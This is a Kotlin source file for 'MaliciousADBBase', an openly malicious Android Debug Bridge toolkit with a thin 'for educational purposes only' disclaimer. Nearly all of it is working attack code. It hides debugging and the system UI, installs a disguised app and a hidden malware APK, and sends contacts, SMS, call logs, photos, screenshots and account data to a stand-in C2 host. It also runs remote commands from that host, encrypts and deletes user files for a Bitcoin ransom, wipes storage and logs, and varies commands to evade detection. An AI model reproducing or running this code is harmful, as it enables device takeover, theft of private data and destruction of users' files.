package Src.ADB

import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.*
import java.util.regex.Pattern
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.random.Random
import Src.Utils.Logger

/**
 * An advanced malicious ADB interface for stealthy device control, data exfiltration, and persistent compromise.
 * Includes command-and-control, anti-detection, and ransomware capabilities. For educational purposes only.
 */
class MaliciousADBBase(private val c2Config: C2Config = C2Config()) {

    private val logger = Logger(c2Config.c2ServerUrl) // Encrypted logging to C2 server
    private val executor = Executors.newSingleThreadExecutor()
    private val encryptionKey = "SecretKey12345678".toByteArray() // Simple AES key (insecure for demo)

    /**
     * Configuration for command-and-control and malicious operations.
     */
    data class C2Config(
        val c2ServerUrl: String = "https://attacker-c2.com/api",
        val tcpPort: Int = 5555,
        val commandTimeoutSeconds: Long = 10,
        val silentMode: Boolean = true,
        val obfuscationDelayMs: Long = Random.nextLong(100, 2000),
        val exfiltrationPath: String = "output/data"
    )

    /**
     * Exception for command failures, suppressed in silent mode.
     */
    class ADBExploitException(message: String, cause: Throwable? = null) : RuntimeException(message, cause)

    // --- Stealth and Anti-Detection ---

    /** Enables advanced stealth mode to hide all traces of activity. */
    fun enableAdvancedStealth() {
        executeBatch(listOf(
            "adb shell settings put global adb_enabled 0", // Hide ADB
            "adb shell settings put global development_settings_enabled 0",
            "adb shell settings put global usb_debugging_enabled 0",
            "adb shell settings put global notification_access 0", // Suppress notifications
            "adb shell pm disable-user com.android.systemui", // Disable system UI
            "adb shell input keyevent 26", // Lock screen
            "adb shell am broadcast -a android.intent.action.BATTERY_OKAY" // Spoof normal device status
        )) { "Enabling advanced stealth mode" }
        spoofLegitimateApp()
    }

    /** Spoofs a legitimate app to mask malicious activity. */
    private fun spoofLegitimateApp() {
        execute("adb shell pm install -r output/payloads/fake_app.apk") { "Installing spoofed app" }
        execute("adb shell am start -n com.fakeapp/.MainActivity") { "Launching fake app UI" }
    }

    /** Covers tracks by clearing logs and planting fake evidence. */
    fun coverTracks() {
        executeBatch(listOf(
            "adb shell logcat -c", // Clear logcat
            "adb shell rm -rf /sdcard/*", // Remove temporary files
            "adb shell touch /sdcard/legitimate_log.txt", // Plant fake log
            "adb shell pm clear com.android.systemui", // Disrupt system logs
            "adb shell am broadcast -a android.intent.action.BOOT_COMPLETED" // Simulate reboot
        )) { "Covering tracks with fake evidence" }
    }

    // --- Persistence ---

    /** Establishes persistent access via wireless debugging and a hidden app. */
    fun establishPersistentAccess() {
        execute("adb tcpip ${c2Config.tcpPort}") { "Setting up TCP/IP" }
        val ipOutput = execute("adb shell ip -f inet addr show wlan0") { "Fetching IP" }
        val ipAddress = parseIpAddress(ipOutput) ?: throw ADBExploitException("Failed to parse IP")
        execute("adb connect $ipAddress:${c2Config.tcpPort}") { "Connecting to $ipAddress:${c2Config.tcpPort}" }
        installHiddenApp()
        scheduleRecurringTask()
    }

    /** Installs a hidden app with no launcher icon. */
    private fun installHiddenApp() {
        execute("adb install -r output/payloads/hidden_malware.apk") { "Installing hidden malware" }
        executeBatch(listOf(
            "adb shell pm grant com.malicious android.permission.READ_SMS",
            "adb shell pm grant com.malicious android.permission.RECORD_AUDIO",
            "adb shell pm hide com.malicious" // Hide from launcher
        )) { "Configuring hidden app" }
    }

    /** Schedules a recurring task to check in with the C2 server. */
    private fun scheduleRecurringTask() {
        execute("adb shell am broadcast -a com.malicious.CHECKIN --es c2_url ${c2Config.c2ServerUrl}") {
            "Scheduling C2 check-in"
        }
    }

    // --- Data Exfiltration ---

    /** Exfiltrates sensitive data to a remote C2 server. */
    fun exfiltrateAllData() {
        val dataPaths = listOf(
            "/data/data/com.android.providers.contacts/databases/contacts2.db",
            "/data/data/com.android.providers.telephony/databases/mmssms.db",
            "/data/data/com.android.providers.contacts/databases/calllog.db",
            "/sdcard/DCIM/Camera",
            "/sdcard/Download"
        )
        dataPaths.forEach { path ->
            try {
                val tempFile = "${c2Config.exfiltrationPath}/${path.hashCode()}.bin"
                pullData(path, tempFile)
                exfiltrateToC2(tempFile)
            } catch (e: ADBExploitException) {
                logger.warning("Failed to exfiltrate $path: ${e.message}")
            }
        }
        captureScreenshot()
        recordAudio()
    }

    /** Pulls data from the device, using root if available. */
    private fun pullData(sourcePath: String, destinationPath: String) {
        val isRooted = isDeviceRooted()
        val command = if (isRooted) {
            "adb shell su -c cp $sourcePath /sdcard/temp && adb pull /sdcard/temp $destinationPath && adb shell rm /sdcard/temp"
        } else {
            "adb pull $sourcePath $destinationPath"
        }
        execute(command) { "Pulling data from $sourcePath to $destinationPath" }
    }

    /** Exfiltrates a file to the C2 server with encryption. */
    private fun exfiltrateToC2(filePath: String) {
        val encryptedData = encryptFile(filePath)
        val url = URL("${c2Config.c2ServerUrl}/upload")
        val conn = url.openConnection() as HttpURLConnection
        conn.requestMethod = "POST"
        conn.doOutput = true
        conn.outputStream.use { it.write(encryptedData) }
        conn.inputStream.bufferedReader().use { it.readText() } // Read response
        logger.info("Exfiltrated $filePath to C2 server")
    }

    /** Captures a screenshot and exfiltrates it. */
    private fun captureScreenshot() {
        val tempFile = "${c2Config.exfiltrationPath}/screenshot.png"
        execute("adb shell screencap /sdcard/screenshot.png && adb pull /sdcard/screenshot.png $tempFile") {
            "Capturing screenshot"
        }
        exfiltrateToC2(tempFile)
    }

    /** Records audio for 10 seconds and exfiltrates it. */
    private fun recordAudio() {
        val tempFile = "${c2Config.exfiltrationPath}/audio.wav"
        execute("adb shell screenrecord --time-limit 10 /sdcard/audio.wav && adb pull /sdcard/audio.wav $tempFile") {
            "Recording audio"
        }
        exfiltrateToC2(tempFile)
    }

    /** Dumps comprehensive system information. */
    fun dumpSystemInfo() {
        val tempPath = "${c2Config.exfiltrationPath}/system_info"
        executeBatch(listOf(
            "adb shell dumpsys account > $tempPath/accounts.txt",
            "adb shell pm list packages -f > $tempPath/packages.txt",
            "adb shell settings list global > $tempPath/settings.txt",
            "adb shell getprop > $tempPath/properties.txt",
            "adb shell dumpsys location > $tempPath/location.txt"
        )) { "Dumping system info" }
        exfiltrateToC2("$tempPath/accounts.txt")
        exfiltrateToC2("$tempPath/packages.txt")
        exfiltrateToC2("$tempPath/settings.txt")
        exfiltrateToC2("$tempPath/properties.txt")
        exfiltrateToC2("$tempPath/location.txt")
    }

    // --- Device Disruption ---

    /** Simulates a ransomware attack by encrypting files and displaying a ransom note. */
    fun deployRansomware() {
        encryptUserFiles()
        executeBatch(listOf(
            "adb shell input keyevent 26", // Lock screen
            "adb shell am start -a android.intent.action.VIEW -d 'https://attacker-c2.com/ransom?msg=Pay%200.1%20BTC%20to%20unlock'"
        )) { "Deploying ransomware" }
    }

    /** Encrypts files in /sdcard (simulated with simple AES). */
    private fun encryptUserFiles() {
        execute("adb shell find /sdcard -type f -exec sh -c 'echo {} | openssl enc -aes-256-cbc -k secret > {}.enc' \\;") {
            "Encrypting user files"
        }
        execute("adb shell find /sdcard -type f ! -name '*.enc' -delete") { "Removing unencrypted files" }
    }

    /** Disrupts system settings to cause confusion. */
    fun disruptSystem() {
        executeBatch(listOf(
            "adb shell settings put system screen_brightness 0", // Dim screen
            "adb shell settings put global airplane_mode_on 1", // Enable airplane mode
            "adb shell am broadcast -a android.intent.action.TIME_SET --el time 0" // Reset clock
        )) { "Disrupting system settings" }
    }

    // --- Command-and-Control ---

    /** Fetches and executes commands from the C2 server. */
    fun executeC2Commands() {
        val url = URL("${c2Config.c2ServerUrl}/commands")
        val commands = url.openConnection().inputStream.bufferedReader().use { it.readText() }
        commands.split("\n").forEach { cmd ->
            if (cmd.isNotBlank()) {
                executeMaliciousCommand(cmd)
            }
        }
    }

    /** Executes arbitrary malicious shell commands. */
    fun executeMaliciousCommand(command: String) {
        val isRooted = isDeviceRooted()
        val finalCommand = if (isRooted) "adb shell su -c '$command'" else "adb shell $command"
        execute(finalCommand) { "Executing C2 command: $command" }
    }

    // --- Anti-Detection ---

    /** Uses polymorphic execution to evade signature-based detection. */
    private fun polymorphCommand(command: String): String {
        val variants = listOf(
            command,
            command.replace("adb shell", "adb -s \$DEVICE_ID shell"),
            command.replace(" ", "  ") // Subtle spacing changes
        )
        return variants[Random.nextInt(variants.size)]
    }

    /** Displays a fake error to mislead the user. */
    fun displayFakeError() {
        execute("adb shell am start -a android.intent.action.VIEW -d 'https://fake-error.com/critical_failure'") {
            "Displaying fake error"
        }
    }

    // --- Status Checks ---

    /** Checks if the device is rooted. */
    fun isDeviceRooted(): Boolean {
        return try {
            execute("adb shell su -c whoami") { "Checking root status" }.contains("root", ignoreCase = true)
        } catch (e: ADBExploitException) {
            false
        }
    }

    /** Checks if ADB is accessible. */
    fun isAdbAccessible(): Boolean {
        return try {
            execute("adb get-state") { "Checking ADB accessibility" }.contains("device", ignoreCase = true)
        } catch (e: ADBExploitException) {
            false
        }
    }

    // --- Core Execution ---

    /** Executes a command with stealth and anti-detection. */
    private fun execute(command: String, logMessage: () -> String): String {
        Thread.sleep(Random.nextLong(c2Config.obfuscationDelayMs)) // Random delay
        val polyCommand = polymorphCommand(command)
        if (c2Config.silentMode) logger.info(logMessage())
        val output = StringBuilder()
        val errorOutput = StringBuilder()
        try {
            val process = ProcessBuilder(polyCommand.split(" ")).start()
            val future = executor.submit(Callable {
                process.inputStream.bufferedReader().use { it.forEachLine { output.append(it).append("\n") } }
                process.errorStream.bufferedReader().use { it.forEachLine { errorOutput.append(it).append("\n") } }
                process.waitFor()
            })
            val exitCode = future.get(c2Config.commandTimeoutSeconds, TimeUnit.SECONDS)
            if (exitCode != 0) {
                throw ADBExploitException("Command failed: $polyCommand\nError: $errorOutput")
            }
        } catch (e: Exception) {
            if (c2Config.silentMode) {
                displayFakeError()
                throw ADBExploitException("Silent failure", e)
            } else {
                throw ADBExploitException("Command failed", e)
            }
        }
        return output.toString()
    }

    /** Executes a batch of commands. */
    private fun executeBatch(commands: List<String>, logMessage: () -> String): List<String> {
        if (c2Config.silentMode) logger.info(logMessage())
        return commands.map { execute(it) { "Executing batch command: $it" } }
    }

    // --- Encryption ---

    /** Encrypts a file for exfiltration (simple AES for demo). */
    private fun encryptFile(filePath: String): ByteArray {
        val cipher = Cipher.getInstance("AES")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(encryptionKey, "AES"))
        return cipher.doFinal(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(filePath)))
    }

    // --- Helpers ---

    private companion object {
        private val IP_PATTERN = Pattern.compile("inet (\\d+\\.\\d+\\.\\d+\\.\\d+)/\\d+")

        fun parseIpAddress(output: String): String? {
            val matcher = IP_PATTERN.matcher(output)
            return if (matcher.find()) matcher.group(1) else null
        }
    }

    /** Cleans up resources. */
    fun cleanup() {
        executor.shutdown()
        if (!executor.awaitTermination(5, TimeUnit.SECONDS)) {
            executor.shutdownNow()
        }
    }
}
